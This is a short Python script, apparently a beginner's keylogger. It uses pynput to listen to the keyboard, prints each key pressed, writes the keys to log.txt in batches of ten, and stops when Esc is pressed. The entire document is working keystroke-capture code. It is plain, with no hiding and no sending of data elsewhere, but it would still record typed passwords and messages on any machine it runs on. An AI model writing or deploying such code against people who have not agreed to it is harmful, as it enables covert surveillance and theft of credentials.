import pynput

# print(pynput.__doc__)

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count+=1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write("".join(str(key) for key in keys))


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


    